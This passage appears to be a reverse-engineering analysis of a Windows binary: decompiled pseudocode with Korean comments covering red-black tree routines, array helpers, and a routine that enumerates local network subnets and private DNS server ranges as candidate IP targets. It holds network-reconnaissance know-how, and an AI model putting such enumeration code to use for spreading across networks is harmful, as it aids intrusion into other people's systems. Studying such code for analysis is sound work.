          *(*(v15[1] + 4) + 20) = 0;
          RBrotateRight_408D50(this, *(v15[1] + 4));
        }
        else
        {
          v16[5] = 1;
          *(v19 + 20) = 1;
          *(*(v15[1] + 4) + 20) = 0;
          v15 = *(v15[1] + 4);
        }
      }
      else if ( v18[5] )
      {
        if ( v15 == *v16 )
        {
          v15 = v15[1];
          RBrotateRight_408D50(this, v16);
        }
        *(v15[1] + 20) = 1;
        *(*(v15[1] + 4) + 20) = 0;
        RBrotateLeft_408CD0(this, *(v15[1] + 4));
      }
      else
      {
        v16[5] = 1;
        v18[5] = 1;
        *(*(v15[1] + 4) + 20) = 0;
        v15 = *(v15[1] + 4);
      }
    }
    *(*(*(this + 4) + 4) + 20) = 1;
    result = a2;
    *a2 = v11;
    *(a2 + 4) = 1;
  }
  else
  {
    v21 = v7;
    v24 = v7;
    if ( v5 )
    {
      if ( v7 == *v6 )
      {
        v22 = *rbInsert_408A60(this, &a3, v8, v7, a3);
        result = a2;
        *a2 = v22;
        *(a2 + 4) = 1;
        return result;
      }
      rbNextInorder_408DD0(&v24);
      v21 = v24;
    }
    if ( *(v21 + 12) >= *v4 )
    {
      result = a2;
      *a2 = v21;
      *(a2 + 4) = 0;
    }
    else
    {
      v23 = *rbInsert_408A60(this, &a3, v8, v7, v4);
      result = a2;
      *a2 = v23;
      *(a2 + 4) = 1;
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: rbTreeDelete_4085D0
// Address: 0x4085D0
// Signature: unknown_signature
// ---------------
_DWORD *__thiscall rbTreeDelete_4085D0(_DWORD *this, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v3; // edi
  _DWORD *v4; // esi
  _DWORD *v5; // ebx
  _DWORD *v6; // ebp
  _DWORD *v7; // eax
  _DWORD *i; // ecx
  _DWORD *v9; // edx
  _DWORD *v10; // ebp
  int v11; // eax
  _DWORD *v12; // eax
  int v13; // eax
  _DWORD *v14; // ecx
  int v15; // eax
  _DWORD *v16; // eax
  _DWORD *v17; // eax
  _DWORD *v18; // ecx
  _DWORD *v19; // eax
  int v20; // ebp
  _DWORD *j; // ecx
  _DWORD *v22; // eax
  int v23; // ecx
  _DWORD *v24; // eax
  int v25; // eax
  _DWORD *v26; // ecx
  int v27; // edx
  _DWORD *v28; // edx
  _DWORD *v29; // eax
  int v30; // ecx
  int v31; // edx
  int v32; // edx
  _DWORD *v33; // edx
  int v34; // ecx
  int v35; // edx
  int v36; // edx
  _DWORD *v37; // edx
  _DWORD *v38; // eax
  _DWORD *v39; // ecx
  int v40; // edx
  _DWORD *v41; // edx
  _DWORD *v42; // ecx
  int v43; // edx
  _DWORD *v44; // edx
  int v45; // edx
  int v46; // edx
  _DWORD *v47; // edx
  _DWORD *v48; // ecx
  _DWORD *result; // eax
  _DWORD *Block; // [esp+14h] [ebp-Ch]
  _DWORD *v52; // [esp+18h] [ebp-8h]
  char v53[4]; // [esp+1Ch] [ebp-4h] BYREF

  v3 = a3;
  rbTreeNextInOrder_408A10(&a3);
  v4 = *v3;
  v5 = v3 + 2;
  Block = v3;
  v6 = v3 + 2;
  if ( *v3 == *&FileName[280] )                 // 레드 블랙 트리의 삭제와 리밸런싱 
  {
    v4 = *v5;
  }
  else
  {
    v7 = *v5;
    if ( *v5 != *&FileName[280] )
    {
      for ( i = *v7; i != *&FileName[280]; i = *i )
        v7 = i;
      v4 = v7[2];
      v6 = v7 + 2;
      Block = v7;
    }
  }
  std::_Lockit::_Lockit(v53);
  v9 = Block;
  if ( Block == v3 )
  {
    v14 = this;
    v4[1] = Block[1];
    v15 = this[1];
    if ( *(v15 + 4) == v3 )
    {
      *(v15 + 4) = v4;
    }
    else
    {
      v16 = v3[1];
      if ( *v16 == v3 )
        *v16 = v4;
      else
        v16[2] = v4;
    }
    v17 = this[1];
    v52 = v17;
    if ( *v17 == v3 )
    {
      if ( *v5 == *&FileName[280] )
      {
        *v17 = v3[1];
      }
      else
      {
        v18 = v4;
        if ( *v4 != *&FileName[280] )
        {
          v19 = *v4;
          do
          {
            v18 = v19;
            v19 = *v19;
          }
          while ( v19 != *&FileName[280] );
          v17 = v52;
        }
        *v17 = v18;
        v14 = this;
      }
    }
    v20 = v14[1];
    if ( *(v20 + 8) == v3 )
    {
      if ( *v3 == *&FileName[280] )
      {
        j = v3[1];
      }
      else
      {
        v22 = v4[2];
        for ( j = v4; v22 != *&FileName[280]; v22 = v22[2] )
          j = v22;
      }
      *(v20 + 8) = j;
    }
    v10 = this;
  }
  else
  {
    *(*v3 + 4) = Block;
    *Block = *v3;
    if ( Block == *v5 )
    {
      v4[1] = Block;
    }
    else
    {
      v4[1] = Block[1];
      *Block[1] = v4;
      *v6 = *v5;
      *(*v5 + 4) = Block;
    }
    v10 = this;
    v11 = this[1];
    if ( *(v11 + 4) == v3 )
    {
      *(v11 + 4) = Block;
    }
    else
    {
      v12 = v3[1];
      if ( *v12 == v3 )
        *v12 = Block;
      else
        v12[2] = Block;
    }
    Block = v3;
    v9[1] = v3[1];
    v13 = v9[5];
    v9[5] = v3[5];
    v3[5] = v13;
    v9 = v3;
  }
  if ( v9[5] == 1 )
  {
    for ( ; v4 != *(v10[1] + 4); v4 = v4[1] )
    {
      if ( v4[5] != 1 )
        break;
      v23 = v4[1];
      v24 = *v23;
      if ( v4 == *v23 )
      {
        v24 = *(v23 + 8);
        if ( !v24[5] )
        {
          v24[5] = 1;
          *(v4[1] + 20) = 0;
          v25 = v4[1];
          v26 = *(v25 + 8);
          *(v25 + 8) = *v26;
          if ( *v26 != *&FileName[280] )
            *(*v26 + 4) = v25;
          v26[1] = *(v25 + 4);
          v27 = v10[1];
          if ( v25 == *(v27 + 4) )
          {
            *(v27 + 4) = v26;
          }
          else
          {
            v28 = *(v25 + 4);
            if ( v25 == *v28 )
              *v28 = v26;
            else
              v28[2] = v26;
          }
          *v26 = v25;
          *(v25 + 4) = v26;
          v24 = *(v4[1] + 8);
        }
        if ( *(*v24 + 20) != 1 || *(v24[2] + 20) != 1 )
        {
          if ( *(v24[2] + 20) == 1 )
          {
            *(*v24 + 20) = 1;
            v34 = *v24;
            v24[5] = 0;
            *v24 = *(v34 + 8);
            v35 = *(v34 + 8);
            if ( v35 != *&FileName[280] )
              *(v35 + 4) = v24;
            *(v34 + 4) = v24[1];
            v36 = v10[1];
            if ( v24 == *(v36 + 4) )
            {
              *(v36 + 4) = v34;
            }
            else
            {
              v37 = v24[1];
              if ( v24 == v37[2] )
                v37[2] = v34;
              else
                *v37 = v34;
            }
            *(v34 + 8) = v24;
            v24[1] = v34;
            v24 = *(v4[1] + 8);
          }
          v24[5] = *(v4[1] + 20);
          *(v4[1] + 20) = 1;
          *(v24[2] + 20) = 1;
          v38 = v4[1];
          v39 = v38[2];
          v38[2] = *v39;
          if ( *v39 != *&FileName[280] )
            *(*v39 + 4) = v38;
          v39[1] = v38[1];
          v40 = v10[1];
          if ( v38 == *(v40 + 4) )
          {
            *(v40 + 4) = v39;
            *v39 = v38;
          }
          else
          {
            v41 = v38[1];
            if ( v38 == *v41 )
              *v41 = v39;
            else
              v41[2] = v39;
            *v39 = v38;
          }
LABEL_100:
          v38[1] = v39;
          break;
        }
      }
      else
      {
        if ( !v24[5] )
        {
          v24[5] = 1;
          *(v4[1] + 20) = 0;
          v29 = v4[1];
          v30 = *v29;
          *v29 = *(*v29 + 8);
          v31 = *(v30 + 8);
          if ( v31 != *&FileName[280] )
            *(v31 + 4) = v29;
          *(v30 + 4) = v29[1];
          v32 = v10[1];
          if ( v29 == *(v32 + 4) )
          {
            *(v32 + 4) = v30;
          }
          else
          {
            v33 = v29[1];
            if ( v29 == v33[2] )
              v33[2] = v30;
            else
              *v33 = v30;
          }
          *(v30 + 8) = v29;
          v29[1] = v30;
          v24 = *v4[1];
        }
        if ( *(v24[2] + 20) != 1 || *(*v24 + 20) != 1 )
        {
          if ( *(*v24 + 20) == 1 )
          {
            *(v24[2] + 20) = 1;
            v42 = v24[2];
            v24[5] = 0;
            v24[2] = *v42;
            if ( *v42 != *&FileName[280] )
              *(*v42 + 4) = v24;
            v42[1] = v24[1];
            v43 = v10[1];
            if ( v24 == *(v43 + 4) )
            {
              *(v43 + 4) = v42;
            }
            else
            {
              v44 = v24[1];
              if ( v24 == *v44 )
                *v44 = v42;
              else
                v44[2] = v42;
            }
            *v42 = v24;
            v24[1] = v42;
            v24 = *v4[1];
          }
          v24[5] = *(v4[1] + 20);
          *(v4[1] + 20) = 1;
          *(*v24 + 20) = 1;
          v38 = v4[1];
          v39 = *v38;
          *v38 = *(*v38 + 8);
          v45 = v39[2];
          if ( v45 != *&FileName[280] )
            *(v45 + 4) = v38;
          v39[1] = v38[1];
          v46 = v10[1];
          if ( v38 == *(v46 + 4) )
          {
            *(v46 + 4) = v39;
          }
          else
          {
            v47 = v38[1];
            if ( v38 == v47[2] )
              v47[2] = v39;
            else
              *v47 = v39;
          }
          v39[2] = v38;
          goto LABEL_100;
        }
      }
      v24[5] = 0;
    }
    v4[5] = 1;
  }
  std::_Lockit::~_Lockit(v53);
  freeBlock_4097FE(Block);
  v48 = a3;
  --v10[3];
  result = a2;
  *a2 = v48;
  return result;
}


// --- Metadata ---
// Function Name: freeRedBlackTree_4089D0
// Address: 0x4089D0
// Signature: unknown_signature
// ---------------
int __stdcall freeRedBlackTree_4089D0(void *Block)
{
  int result; // eax
  void *v2; // edi
  void **v3; // esi

  result = *&FileName[280];
  v2 = Block;
  v3 = Block;
  if ( Block != *&FileName[280] )               // 레드블랙 트리 삭제 
  {
    do
    {
      freeRedBlackTree_4089D0(v3[2]);
      v3 = *v3;
      freeBlock_4097FE(v2);
      result = *&FileName[280];
      v2 = v3;
    }
    while ( v3 != *&FileName[280] );
  }
  return result;
}


// --- Metadata ---
// Function Name: rbTreeNextInOrder_408A10
// Address: 0x408A10
// Signature: unknown_signature
// ---------------
_DWORD *__thiscall rbTreeNextInOrder_408A10(void *this)
{
  _DWORD **v1; // edx
  _DWORD *result; // eax

  v1 = *(*this + 8);
  if ( v1 == *&FileName[280] )                  // 레드블랙 트리 인오더 탐색 
  {
    for ( result = *(*this + 4); *this == result[2]; result = result[1] )
      *this = result;
    if ( *(*this + 8) != result )
      *this = result;
  }
  else
  {
    for ( result = *v1; result != *&FileName[280]; result = *result )
      v1 = result;
    *this = v1;
  }
  return result;
}


// --- Metadata ---
// Function Name: rbInsert_408A60
// Address: 0x408A60
// Signature: unknown_signature
// ---------------
_DWORD *__thiscall rbInsert_408A60(_DWORD *this, _DWORD *a2, int a3, _DWORD *a4, _DWORD *a5)
{
  _DWORD *v6; // ebp
  _DWORD *v7; // eax
  int v8; // eax
  _DWORD *v9; // eax
  _DWORD *v10; // eax
  _DWORD *v11; // ecx
  _DWORD *v12; // esi
  _DWORD *v13; // edx
  int v14; // edx
  _DWORD *v15; // ecx
  int v16; // edx
  _DWORD *v17; // edx
  _DWORD *v18; // ecx
  _DWORD *v19; // edx
  int v20; // esi
  int v21; // esi
  _DWORD *v22; // esi
  _DWORD *v23; // ecx
  int v24; // edx
  int v25; // edx
  _DWORD *v26; // edx
  int v27; // esi
  _DWORD *v28; // esi
  _DWORD *result; // eax

  v6 = operator new(0x18u);
  v6[1] = a4;
  v6[5] = 0;
  *v6 = *&FileName[280];
  v6[2] = *&FileName[280];
  copyNodeData_408E30(v6 + 3, a5);
  v7 = this[1];
  ++this[3];
  if ( a4 == v7 || a3 != *&FileName[280] || *a5 < a4[3] )
  {
    *a4 = v6;
    v9 = this[1];
    if ( a4 == v9 )
    {
      v9[1] = v6;
      *(this[1] + 8) = v6;
    }
    else if ( a4 == *v9 )
    {
      *v9 = v6;
    }
  }
  else
  {
    a4[2] = v6;
    v8 = this[1];
    if ( a4 == *(v8 + 8) )
      *(v8 + 8) = v6;
  }
  v10 = v6;
  while ( v10 != *(this[1] + 4) )
  {
    v11 = v10[1];
    if ( v11[5] )
      break;
    v12 = v11[1];
    v13 = *v12;
    if ( v11 == *v12 )
    {
      v14 = v12[2];
      if ( *(v14 + 20) )
      {
        if ( v10 == v11[2] )
        {
          v10 = v10[1];
          v15 = v11[2];
          v10[2] = *v15;
          if ( *v15 != *&FileName[280] )
            *(*v15 + 4) = v10;
          v15[1] = v10[1];
          v16 = this[1];
          if ( v10 == *(v16 + 4) )
          {
            *(v16 + 4) = v15;
          }
          else
          {
            v17 = v10[1];
            if ( v10 == *v17 )
              *v17 = v15;
            else
              v17[2] = v15;
          }
          *v15 = v10;
          v10[1] = v15;
        }
        *(v10[1] + 20) = 1;
        *(*(v10[1] + 4) + 20) = 0;
        v18 = *(v10[1] + 4);
        v19 = *v18;
        *v18 = *(*v18 + 8);
        v20 = v19[2];
        if ( v20 != *&FileName[280] )
          *(v20 + 4) = v18;
        v19[1] = v18[1];
        v21 = this[1];
        if ( v18 == *(v21 + 4) )
        {
          *(v21 + 4) = v19;
          v19[2] = v18;
        }
        else
        {
          v22 = v18[1];
          if ( v18 == v22[2] )
            v22[2] = v19;
          else
            *v22 = v19;
          v19[2] = v18;
        }
LABEL_51:
        v18[1] = v19;
        continue;
      }
      v11[5] = 1;
      *(v14 + 20) = 1;
      *(*(v10[1] + 4) + 20) = 0;
      v10 = *(v10[1] + 4);
    }
    else
    {
      if ( v13[5] )
      {
        if ( v10 == *v11 )
        {
          v10 = v10[1];
          v23 = *v11;
          *v10 = v23[2];
          v24 = v23[2];
          if ( v24 != *&FileName[280] )
            *(v24 + 4) = v10;
          v23[1] = v10[1];
          v25 = this[1];
          if ( v10 == *(v25 + 4) )
          {
            *(v25 + 4) = v23;
          }
          else
          {
            v26 = v10[1];
            if ( v10 == v26[2] )
              v26[2] = v23;
            else
              *v26 = v23;
          }
          v23[2] = v10;
          v10[1] = v23;
        }
        *(v10[1] + 20) = 1;
        *(*(v10[1] + 4) + 20) = 0;
        v18 = *(v10[1] + 4);
        v19 = v18[2];
        v18[2] = *v19;
        if ( *v19 != *&FileName[280] )
          *(*v19 + 4) = v18;
        v19[1] = v18[1];
        v27 = this[1];
        if ( v18 == *(v27 + 4) )
        {
          *(v27 + 4) = v19;
        }
        else
        {
          v28 = v18[1];
          if ( v18 == *v28 )
            *v28 = v19;
          else
            v28[2] = v19;
        }
        *v19 = v18;
        goto LABEL_51;
      }
      v11[5] = 1;
      v13[5] = 1;
      *(*(v10[1] + 4) + 20) = 0;
      v10 = *(v10[1] + 4);
    }
  }
  *(*(this[1] + 4) + 20) = 1;
  result = a2;
  *a2 = v6;
  return result;
}


// --- Metadata ---
// Function Name: RBrotateLeft_408CD0
// Address: 0x408CD0
// Signature: unknown_signature
// ---------------
int *__thiscall RBrotateLeft_408CD0(_DWORD *this, int a2)
{
  int *result; // eax
  int v3; // ecx
  int **v4; // ecx

  result = *(a2 + 8);
  *(a2 + 8) = *result;
  if ( *result != *&FileName[280] )
    *(*result + 4) = a2;
  result[1] = *(a2 + 4);
  v3 = this[1];
  if ( a2 == *(v3 + 4) )
  {
    *(v3 + 4) = result;
    *result = a2;
    *(a2 + 4) = result;
  }
  else
  {
    v4 = *(a2 + 4);
    if ( a2 == *v4 )
      *v4 = result;
    else
      v4[2] = result;
    *result = a2;
    *(a2 + 4) = result;
  }
  return result;
}


// --- Metadata ---
// Function Name: findMinNode_408D30
// Address: 0x408D30
// Signature: unknown_signature
// ---------------
_DWORD *__cdecl findMinNode_408D30(_DWORD **a1)
{
  _DWORD *result; // eax
  _DWORD *i; // ecx

  result = a1;
  for ( i = *a1; i != *&FileName[280]; i = *i ) // 최소 노드 찾기 
    result = i;
  return result;
}


// --- Metadata ---
// Function Name: RBrotateRight_408D50
// Address: 0x408D50
// Signature: unknown_signature
// ---------------
int __thiscall RBrotateRight_408D50(_DWORD *this, _DWORD *a2)
{
  int result; // eax
  int v3; // esi
  int v4; // ecx
  _DWORD *v5; // ecx

  result = *a2;
  *a2 = *(*a2 + 8);
  v3 = *(result + 8);
  if ( v3 != *&FileName[280] )
    *(v3 + 4) = a2;
  *(result + 4) = a2[1];
  v4 = this[1];
  if ( a2 == *(v4 + 4) )
  {
    *(v4 + 4) = result;
    *(result + 8) = a2;
    a2[1] = result;
  }
  else
  {
    v5 = a2[1];
    if ( a2 == v5[2] )
      v5[2] = result;
    else
      *v5 = result;
    *(result + 8) = a2;
    a2[1] = result;
  }
  return result;
}


// --- Metadata ---
// Function Name: createRbNode_408DB0
// Address: 0x408DB0
// Signature: unknown_signature
// ---------------
_DWORD *__stdcall createRbNode_408DB0(int a1, int a2)
{
  _DWORD *result; // eax

  result = operator new(0x18u);
  result[1] = a1;
  result[5] = a2;
  return result;
}


// --- Metadata ---
// Function Name: rbNextInorder_408DD0
// Address: 0x408DD0
// Signature: unknown_signature
// ---------------
_DWORD *__thiscall rbNextInorder_408DD0(void *this)
{
  _DWORD *v1; // eax
  _DWORD *result; // eax
  _DWORD *v3; // edx

  v1 = *this;
  if ( *(*this + 20) || *(v1[1] + 4) != v1 )
  {
    v3 = *v1;
    if ( *v1 == *&FileName[280] )
    {
      for ( result = v1[1]; *this == *result; result = result[1] )
        *this = result;
      *this = result;
    }
    else
    {
      for ( result = v3[2]; result != *&FileName[280]; result = result[2] )
        v3 = result;
      *this = v3;
    }
  }
  else
  {
    result = v1[2];
    *this = result;
  }
  return result;
}


// --- Metadata ---
// Function Name: copyNodeData_408E30
// Address: 0x408E30
// Signature: unknown_signature
// ---------------
_DWORD *__cdecl copyNodeData_408E30(_DWORD *a1, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a1;
  if ( a1 )
  {
    *a1 = *a2;
    a1[1] = a2[1];
  }
  return result;
}


// --- Metadata ---
// Function Name: AppendIPRangeToBuffer_408E50
// Address: 0x408E50
// Signature: unknown_signature
// ---------------
u_long __cdecl AppendIPRangeToBuffer_408E50(int a1, u_long hostlong, u_long i)
{
  u_long v3; // esi
  u_long result; // eax
  u_long v5; // ebp
  u_long v6; // ebx
  u_long v8; // eax
  int v9; // edx
  u_long *v10; // eax
  u_long *v11; // edi
  int v12; // edx
  unsigned int v13; // ecx
  int v14; // eax
  int v15; // eax
  _DWORD *v16; // eax
  u_long *v17; // ebp
  _DWORD *j; // ebx
  int v19; // eax
  int v20; // ecx
  int v21; // [esp+Ch] [ebp-8h]
  u_long v22; // [esp+10h] [ebp-4h]
  int v23; // [esp+18h] [ebp+4h]

  v3 = htonl(hostlong);
  result = htonl(i);
  v5 = result;
  v6 = v3;
  v22 = result;
  for ( i = v3; v6 <= v5; i = v6 )              // IP 범위를 버퍼에 저장 
  {
    result = v6;
    if ( v6 && v6 != 255 )
    {
      v8 = ntohl(v6);
      v9 = *(a1 + 12);
      hostlong = v8;
      v10 = *(a1 + 8);
      v11 = v10;
      if ( (v9 - v10) >> 2 )
      {
        copyRange_409050(v10, v10, v10 + 1);
        fillArrayWithValue_409080(*(a1 + 8), (1 - ((*(a1 + 8) - v11) >> 2)), &hostlong);
        for ( result = *(a1 + 8); v11 != result; ++v11 )
          *v11 = hostlong;
        *(a1 + 8) += 4;
      }
      else
      {
        v12 = *(a1 + 4);
        if ( !v12 || (v13 = (v10 - v12) >> 2, v13 <= 1) )
          v13 = 1;
        if ( v12 )
          v14 = (v10 - v12) >> 2;
        else
          v14 = 0;
        v15 = v13 + v14;
        v21 = v15;
        if ( v15 < 0 )
          v15 = 0;
        v16 = operator new(4 * v15);
        v17 = *(a1 + 4);
        v23 = v16;
        for ( j = v16; v17 != v11; ++j )
          copySingle_4090B0(j, v17++);
        fillArrayWithValue_409080(j, 1, &hostlong);
        copyRange_409050(v11, *(a1 + 8), j + 1);
        nullsub_2(*(a1 + 4), *(a1 + 8));
        freeBlock_4097FE(*(a1 + 4));
        v19 = *(a1 + 4);
        *(a1 + 12) = v23 + 4 * v21;
        if ( v19 )
          v20 = (*(a1 + 8) - v19) >> 2;
        else
          v20 = 0;
        v5 = v22;
        v6 = i;
        result = v23 + 4 * v20 + 4;
        *(a1 + 4) = v23;
        *(a1 + 8) = result;
      }
    }
    ++v6;
  }
  return result;
}


// --- Metadata ---
// Function Name: nullsub_2
// Address: 0x409040
// Signature: unknown_signature
// ---------------
void __stdcall nullsub_2(int a1, int a2)
{
  ;
}


// --- Metadata ---
// Function Name: copyRange_409050
// Address: 0x409050
// Signature: unknown_signature
// ---------------
_DWORD *__stdcall copyRange_409050(_DWORD *a1, _DWORD *a2, _DWORD *a3)
{
  _DWORD *v3; // ecx
  _DWORD *result; // eax

  v3 = a1;
  if ( a1 == a2 )                               // [srcBegin, srcEnd) 범위의 내용을 dst로 복사 
    return a3;
  result = a3;
  do
  {
    if ( result )
      *result = *v3;
    ++v3;
    ++result;
  }
  while ( v3 != a2 );
  return result;
}


// --- Metadata ---
// Function Name: fillArrayWithValue_409080
// Address: 0x409080
// Signature: unknown_signature
// ---------------
_DWORD *__stdcall fillArrayWithValue_409080(_DWORD *a1, _DWORD *a2, _DWORD *a3)
{
  _DWORD *result; // eax
  _DWORD *v4; // ecx

  result = a2;
  if ( a2 )                                     // *dst부터 *count개 만큼 *value를 채워넣는 함수 
  {
    v4 = a2;
    result = a1;
    do
    {
      if ( result )
        *result = *a3;
      ++result;
      v4 = (v4 - 1);
    }
    while ( v4 );
  }
  return result;
}


// --- Metadata ---
// Function Name: copySingle_4090B0
// Address: 0x4090B0
// Signature: unknown_signature
// ---------------
_DWORD *__cdecl copySingle_4090B0(_DWORD *a1, _DWORD *a2)
{
  _DWORD *result; // eax

  result = a1;
  if ( a1 )
    *a1 = *a2;
  return result;
}


// --- Metadata ---
// Function Name: isIPInRange_4090D0
// Address: 0x4090D0
// Signature: unknown_signature
// ---------------
BOOL __cdecl isIPInRange_4090D0(u_long hostlong, u_long a2, u_long a3)
{
  u_long v3; // edi
  u_long v4; // esi
  BOOL result; // eax

  v3 = htonl(hostlong);                         // hostlong이 [a2, a3] 범위 내에 있는지를 확인 
  result = 0;
  if ( htonl(a2) <= v3 )
  {
    v4 = htonl(hostlong);
    if ( v4 <= htonl(a3) )
      result = 1;
  }
  return result;
}


// --- Metadata ---
// Function Name: isPrivateIP_409110
// Address: 0x409110
// Signature: unknown_signature
// ---------------
BOOL __cdecl isPrivateIP_409110(u_long hostlong)
{
  u_long v1; // eax 다음 RFC1918 사설 IP 블록에 속하는지 검사
             //     
             //     10.0.0.0/8 (0x0A000000–0x0AFFFFFF)
             //     
             //     172.16.0.0/12 (0xAC100000–0xAC1FFFFF)
             //     
             //     192.168.0.0/16 (0xC0A80000–0xC0A8FFFF) 

  v1 = htonl(hostlong);
  if ( v1 >= 0xA000000 && v1 <= 0xAFFFFFF )
    return 1;
  if ( v1 >= 0xAC100000 && v1 <= 0xAC1FFFFF )
    return 1;
  return v1 >= 0xC0A80000 && v1 <= 0xC0A8FFFF;
}


// --- Metadata ---
// Function Name: collectLocalNetworkIPRanges_409160
// Address: 0x409160
// Signature: unknown_signature
// ---------------
int __cdecl collectLocalNetworkIPRanges_409160(int a1, int a2)
{
  struct _IP_ADAPTER_INFO *v2; // eax
  ULONG *v3; // esi
  int v5; // edi
  unsigned int v6; // eax
  int v7; // ebx
  int v8; // ebp
  ULONG *v9; // edi
  unsigned int v10; // eax
  u_long v11; // esi
  u_long v12; // eax
  u_long v13; // eax
  u_long v14; // eax
  IP_PER_ADAPTER_INFO_W2KSP1 *v15; // esi
  IP_ADDR_STRING *v16; // edi
  unsigned int v17; // eax
  u_long v18; // esi
  u_long v19; // eax
  u_long v20; // eax
  u_long v21; // eax
  char *v22; // ebx
  char *v23; // edi
  char *v24; // esi
  unsigned int v25; // edi
  unsigned int v26; // ecx
  char *v27; // eax
  char *v28; // edx
  int *v29; // edx
  int *v30; // eax
  int *v31; // ecx
  int *v32; // edi
  int *i; // eax
  int *v34; // esi
  int *j; // eax
  int v36; // edx
  char *v37; // [esp-14h] [ebp-2Ch]
  u_long v38; // [esp-10h] [ebp-28h]
  u_long v39; // [esp-10h] [ebp-28h]
  ULONG SizePointer; // [esp+4h] [ebp-14h] BYREF
  HLOCAL hMem; // [esp+8h] [ebp-10h]
  ULONG *v42; // [esp+Ch] [ebp-Ch]
  unsigned int v43; // [esp+10h] [ebp-8h] BYREF
  IP_PER_ADAPTER_INFO_W2KSP1 *v44; // [esp+14h] [ebp-4h]

  SizePointer = 0;
  if ( GetAdaptersInfo(0, &SizePointer) != 111 )
    return 0;
  if ( !SizePointer )
    return 0;
  v2 = LocalAlloc(0, SizePointer);
  v3 = v2;
  hMem = v2;
  if ( !v2 )
    return 0;
  if ( GetAdaptersInfo(v2, &SizePointer) )      // 로컬 머신의 네트워크 어댑터 정보를 읽기 
  {
    LocalFree(v3);
    return 0;
  }
  while ( 1 )                                   // 각 인터페이스의 서브넷(네트워크 주소–브로드캐스트 주소)과 DNS 서버(사설 IP만) 범위를 IP 범위 버퍼에 추가
  {
    v5 = (v3 + 107);
    v42 = v3 + 107;
    if ( v3 != -428 )
    {
      while ( 1 )
      {
        v43 = inet_addr((v5 + 4));
        v6 = inet_addr((v5 + 20));
        if ( v43 != -1 && v43 && v6 != -1 && v6 )
        {
          v7 = v43 & v6;
          v8 = v43 | ~v6;
          AppendIPRangeToBuffer_408E50(a1, v43 & v6, v8);
          insertValueIntoArray_409470(a2, *(a2 + 8), 1u, &v43);
          v9 = v3 + 117;
          if ( v3 != -468 )
          {
            do
            {
              v10 = inet_addr(v9 + 4);
              v11 = v10;
              if ( v10 != -1 && v10 && !isIPInRange_4090D0(v10, v7, v8) )
              {
                v12 = htonl(v11);
                LOBYTE(v12) = -1;
                v38 = ntohl(v12);
                v13 = htonl(v11);
                LOBYTE(v13) = 0;
                v14 = ntohl(v13);
                AppendIPRangeToBuffer_408E50(a1, v14, v38);
              }
              v9 = *v9;
            }
            while ( v9 );
            v3 = hMem;
          }
          if ( GetPerAdapterInfo(v3[103], 0, &SizePointer) == 111 )
          {
            v15 = LocalAlloc(0, SizePointer);
            v44 = v15;
            if ( v15 )
            {
              if ( GetPerAdapterInfo(*(hMem + 103), v15, &SizePointer) )
              {
                v16 = &v15->DnsServerList;
                if ( v15 != -12 )
                {
                  do
                  {
                    v17 = inet_addr(v16->IpAddress.String);
                    v18 = v17;
                    if ( v17 != -1 && v17 && isPrivateIP_409110(v17) && !isIPInRange_4090D0(v18, v7, v8) )
                    {
                      v19 = htonl(v18);
                      LOBYTE(v19) = -1;
                      v39 = ntohl(v19);
                      v20 = htonl(v18);
                      LOBYTE(v20) = 0;
                      v21 = ntohl(v20);
                      AppendIPRangeToBuffer_408E50(a1, v21, v39);
                    }
                    v16 = v16->Next;
                  }
                  while ( v16 );
                  v15 = v44;
                }
              }
            }
            LocalFree(v15);
            v3 = hMem;
          }
          v5 = v42;
        }
        v42 = *v5;
        if ( !v42 )
          break;
        v5 = v42;
      }
    }
    hMem = *v3;
    if ( !hMem )
      break;
    v3 = hMem;
  }
  v23 = *(a1 + 4);
  v37 = *(a1 + 8);
  v22 = v37;
  if ( ((v37 - v23) & 0xFFFFFFFC) > 64 )        // 최종적으로 모든 범위를 정렬·병합·중복 제거
  {
    quickSort_409680(v23, v37);
    v24 = v23 + 64;
    insertionSort_409750(v23, v23 + 16);
    if ( v23 + 64 != v22 )
    {
      do
      {
        v25 = *v24;
        v26 = *(v24 - 1);
        v27 = v24 - 4;
        v28 = v24;
        if ( *v24 < v26 )
        {
          do
          {
            *v28 = v26;
            v26 = *(v27 - 1);
            v28 = v27;
            v27 -= 4;
          }
          while ( v25 < v26 );
        }
        v24 += 4;
        *v28 = v25;
      }
      while ( v24 != v22 );
    }
  }
  else
  {
    insertionSort_409750(v23, v37);
  }
  v29 = *(a1 + 8);
  v30 = *(a1 + 4);
  v31 = v30;
  if ( v30 != v29 )
  {
    while ( ++v30 != v29 )
    {
      if ( *v31 == *v30 )
      {
        if ( v31 != v29 )
        {
          v32 = v31++;
          for ( i = v31; i != v29; ++i )
          {
            if ( *v32 != *i )
            {
              *v31 = *i;
              v32 = i;
              ++v31;
            }
          }
        }
        goto LABEL_54;
      }
      v31 = v30;
    }
  }
  v31 = *(a1 + 8);
LABEL_54:
  v34 = *(a1 + 8);
  for ( j = v29; j != v34; ++v31 )
  {
    v36 = *j++;
    *v31 = v36;
  }
  *(a1 + 8) = v31;
  LocalFree(hMem);
  return 1;
}


// --- Metadata ---
// Function Name: insertValueIntoArray_409470
// Address: 0x409470
// Signature: unknown_signature
// ---------------
_DWORD *__thiscall insertValueIntoArray_409470(int this, _DWORD *a2, unsigned int a3, _DWORD *a4)
{
  int v5; // edi
  _DWORD *result; // eax
  int v7; // edx
  unsigned int v8; // ecx
  int v9; // eax
  int v10; // eax
  _DWORD *v11; // ecx
  _DWORD *m; // eax
  _DWORD *v13; // eax
  unsigned int v14; // edx
  _DWORD *v15; // edi
  _DWORD *v16; // edx
  _DWORD *v17; // eax
  int v18; // ecx
  int v19; // eax
  unsigned int v20; // ebx
  _DWORD *v21; // esi
  _DWORD *v22; // ecx
  _DWORD *v23; // eax
  unsigned int k; // ebp
  _DWORD *v25; // ecx
  _DWORD *l; // eax
  unsigned int v27; // ebp
  _DWORD *v28; // esi
  _DWORD *i; // ecx
  _DWORD *v30; // ecx
  _DWORD *j; // eax
  int v32; // esi
  int v34; // [esp+14h] [ebp-4h]
  _DWORD *v35; // [esp+20h] [ebp+8h]

  v5 = this;
  result = *(this + 8);                         // 동적 배열(버퍼)에 지정된 위치에 값을 삽입하는 함수 
  if ( (*(this + 12) - result) >> 2 >= a3 )
  {
    if ( result - a2 >= a3 )
    {
      if ( a3 )
      {
        v27 = 4 * a3;
        v28 = *(this + 8);
        for ( i = &result[-a3]; i != result; ++v28 )
        {
          if ( v28 )
            *v28 = *i;
          ++i;
        }
        v30 = *(v5 + 8);
